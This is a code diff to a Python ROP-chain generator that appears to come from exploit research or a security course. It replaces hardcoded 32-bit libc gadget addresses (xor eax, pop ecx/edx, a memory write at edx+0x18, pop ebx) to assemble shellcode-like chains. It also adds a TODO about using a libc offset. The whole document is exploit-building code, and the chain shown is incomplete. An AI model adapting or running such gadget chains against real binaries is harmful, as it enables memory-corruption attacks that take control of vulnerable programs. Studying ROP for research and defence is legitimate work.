@@ -29,18 +29,20 @@ class GenerateShellcode:
 
     def store_gadget(self, gadget_str):
         libc_gadget = self.rop_chain.get_gadget(gadget_str) + self.libc_offset
-        print(gadget_str + " => " + hex(libc_gadget))
+        print("GADGET: " + gadget_str + " => " + hex(libc_gadget))
         self.store_word(libc_gadget)
 
     def get_shellcode(self):
+        # TODO(samanthayu): Use libc offset
         self.store_word(0xb7e3579c)  # xor eax, eax ; ret ;
-        self.store_word(0xb7ebe377)  # pop ecx ; ret ;
-
-        # Geometry of Flesh uses movl %eax, 24(%edx), but this gadget does not exist in our libc
-        # We need edx to point to a NULL pointer
+        self.store_word(0xb7e34c6c)  # pop ecx ; pop edx ; ret ;
         self.store_word(0x0b0b0b0b)
-        self.store_word(0xb7e34c6d) # pop edx ; ret ;
-        self.store_word(0x0)
+        self.store_word(self.libc_offset - 0x18)   # 0x18 is 24 in hex
+        self.store_word(0xb7e34ca3)  # mov dword ptr [edx + 0x18], eax ; ret ;
+        self.store_word(0xb7e688a7)  # add al, ch ; ret ;
+        self.store_word(0xb7ef11c8)  # pop ebx ; ret ;
+        self.store_word(0xb7e34c6c)  # pop ecx ; pop edx ; ret ;
+
 
 if __name__ == "__main__":
     arg_parser = argparse.ArgumentParser(description="Create a ROP chain using the gadgets found")
